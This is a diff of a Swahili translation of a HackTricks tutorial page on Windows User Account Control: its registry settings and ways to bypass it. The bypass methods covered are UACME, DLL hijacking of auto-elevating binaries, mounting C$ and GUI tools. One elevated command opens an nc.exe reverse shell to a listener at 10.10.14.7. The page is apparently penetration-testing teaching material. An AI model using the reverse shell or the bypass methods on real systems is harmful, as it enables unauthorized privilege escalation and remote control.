@@ -2,13 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-Tumia [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kujenga na **kujiendesha** kazi kwa urahisi zenye nguvu za zana za jamii **za kisasa zaidi** duniani.\
-Pata Ufikiaji Leo:
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
-
 ## UAC
 
 [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kufanya kazi ambazo **zinaweza kuhatarisha mfumo**. Wakati UAC imewezeshwa, programu na kazi kila wakati **zinafanya kazi chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe waziwazi programu/hizi kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini hakichukuliwi kama mpaka wa usalama.
@@ -19,9 +12,9 @@ Kwa maelezo zaidi kuhusu viwango vya integrity:
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-Wakati UAC ipo, mtumiaji wa msimamizi anapewa tokeni 2: ufunguo wa mtumiaji wa kawaida, kufanya vitendo vya kawaida kama kiwango cha kawaida, na moja yenye haki za msimamizi.
+Wakati UAC ipo, mtumiaji wa msimamizi anapewa tokeni 2: ufunguo wa mtumiaji wa kawaida, ili kufanya vitendo vya kawaida kama kiwango cha kawaida, na moja yenye ruhusa za msimamizi.
 
-Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuunda jinsi UAC inavyofanya kazi maalum kwa shirika lao katika ngazi ya ndani (wakati wa kutumia secpol.msc), au kuundwa na kusukumwa kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Group Policy ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo zaidi:
+Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuunda jinsi UAC inavyofanya kazi maalum kwa shirika lao katika ngazi ya ndani (wakati wa kutumia secpol.msc), au kuundwa na kusukumwa kupitia Vitu vya Sera za Kundi (GPO) katika mazingira ya Active Directory. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Sera za Kundi ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo zaidi:
 
 | Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
@@ -53,7 +46,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Ikiwa ni **`1`** basi UAC ime **aktivishwa**, ikiwa ni **`0`** au haipo, basi UAC ni **isiyokuwa na shughuli**.
+Ikiwa ni **`1`** basi UAC ime **wezeshwa**, ikiwa ni **`0`** au haipo, basi UAC haijawa **wezeshwa**.
 
 Kisha, angalia **ni kiwango gani** kimewekwa:
 ```
@@ -63,8 +56,8 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 - Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
-- Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza binary kwa haki za juu (katika Desktop Salama)
-- Ikiwa **`2`** (**Daima niarifu**) UAC itakuwa inahitaji kila wakati uthibitisho kutoka kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
+- Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
+- Ikiwa **`2`** (**Daima niarifu**) UAC itakuwa inahitaji daima uthibitisho kutoka kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
 - Ikiwa **`3`** kama `1` lakini si lazima katika Desktop Salama
 - Ikiwa **`4`** kama `2` lakini si lazima katika Desktop Salama
 - ikiwa **`5`**(**kawaida**) itamwomba msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu
@@ -78,7 +71,7 @@ Ikiwa **`0`**(kawaida), akaunti ya **Msimamizi wa ndani inaweza** kufanya kazi z
 #### Muhtasari
 
 - Ikiwa `EnableLUA=0` au **haipo**, **hakuna UAC kwa mtu yeyote**
-- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , Hakuna UAC kwa mtu yeyote**
+- Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1`, Hakuna UAC kwa mtu yeyote**
 - Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=0`, Hakuna UAC kwa RID 500 (Msimamizi wa ndani)**
 - Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=1`, UAC kwa kila mtu**
 
@@ -106,12 +99,12 @@ Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **ku
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### UAC bypass kwa kuiga tokeni
+#### UAC bypass kwa kunakili token
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Sana** Msingi UAC "bypass" (ufikiaji wa mfumo wa faili kamili)
+### **Sana** Msingi UAC "bypass" (ufikiaji kamili wa mfumo wa faili)
 
 Ikiwa una shell na mtumiaji ambaye yuko ndani ya kundi la Wasimamizi unaweza **kuunganisha C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) ndani ya diski mpya na utakuwa na **ufikiaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Msimamizi).
 
@@ -149,7 +142,7 @@ Hati na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.co
 [**UACME** ](https://github.com/hfiref0x/UACME)ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
 Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maombi mengine** ambayo yatamwonya **mtumiaji** kwamba kuna kitu kinatokea.
 
-UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusisha toleo lako:
+UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusiana na toleo lako:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -159,11 +152,11 @@ Major  Minor  Build  Revision
 ```
 Pia, ukitumia [hii](https://en.wikipedia.org/wiki/Windows_10_version_history) ukurasa unapata toleo la Windows `1607` kutoka kwa toleo la kujenga.
 
-#### Zaidi ya UAC bypass
+#### UAC bypass zaidi
 
-**Mbinu zote** zinazotumika hapa kupita AUC **zinahitaji** **shell ya mwingiliano kamili** na mwathirika (shell ya kawaida ya nc.exe haitoshi).
+**Teknolojia zote** zinazotumika hapa kukwepa AUC **zinahitaji** **shell ya mwingiliano kamili** na mwathirika (shell ya kawaida ya nc.exe haitoshi).
 
-Unaweza kupata kwa kutumia **meterpreter** kikao. Hamisha kwa **mchakato** ambao una **Thamani ya Kikao** sawa na **1**:
+Unaweza kupata kwa kutumia **meterpreter** session. Hamisha kwa **mchakato** ambao una **Thamani ya Kikao** sawa na **1**:
 
 ![](<../../images/image (96).png>)
 
@@ -171,34 +164,27 @@ Unaweza kupata kwa kutumia **meterpreter** kikao. Hamisha kwa **mchakato** ambao
 
 ### UAC Bypass na GUI
 
-Ikiwa una ufikiaji wa **GUI unaweza tu kukubali kiashiria cha UAC** unapokipata, huwezi kweli kuhitaji kupita. Hivyo, kupata ufikiaji wa GUI kutakuruhusu kupita UAC.
+Ikiwa una ufikiaji wa **GUI unaweza tu kukubali kiashiria cha UAC** unapokipata, huwezi kweli kuhitaji kukwepa. Hivyo, kupata ufikiaji wa GUI kutakuruhusu kukwepa UAC.
 
-Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akikitumia (labda kupitia RDP) kuna **zana kadhaa ambazo zitakuwa zikifanya kazi kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama msimamizi** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **kujificha** zaidi.
+Zaidi ya hayo, ikiwa unapata session ya GUI ambayo mtu alikuwa akitumia (labda kupitia RDP) kuna **zana kadhaa ambazo zitakuwa zikifanya kazi kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama msimamizi** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **kujificha** zaidi.
 
 ### UAC bypass ya nguvu inayosikika
 
 Ikiwa hujali kuhusu kuwa na kelele unaweza kila wakati **kufanya kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **kinahitaji kuinua ruhusa hadi mtumiaji akubali**.
 
-### Bypass yako mwenyewe - Mbinu ya msingi ya UAC bypass
+### Kukwepa kwako mwenyewe - Mbinu ya msingi ya UAC bypass
 
-Ikiwa utaangalia **UACME** utaona kwamba **zaidi ya UAC bypasses zinatumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).
+Ikiwa utaangalia **UACME** utaona kwamba **kebisha nyingi za UAC zinatumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).
 
 1. Tafuta binary ambayo itafanya **autoelevate** (angalia kwamba inapotekelezwa inafanya kazi katika kiwango cha juu cha uaminifu).
 2. Kwa procmon pata matukio ya "**JINA HALIKUPATIKANA**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
-3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kupita hii kwa kutumia:
-   1. **wusa.exe**: Windows 7, 8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
+3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kukwepa hii kwa kutumia:
+   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
    2. **IFileOperation**: Windows 10.
 4. Andaa **script** ya nakala ya DLL yako ndani ya njia iliyolindwa na kutekeleza binary hatarini na inayojitenga.
 
 ### Mbinu nyingine ya UAC bypass
 
 Inajumuisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka kwa **rejista** jina/njia ya **binary** au **amri** inayopaswa **kutekelezwa** (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).
-
-<figure><img src="../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-Tumia [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kujenga kwa urahisi na **kujiendesha** kazi zinazotolewa na zana za jamii **zilizoendelea zaidi** duniani.\
-Pata Ufikiaji Leo:
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
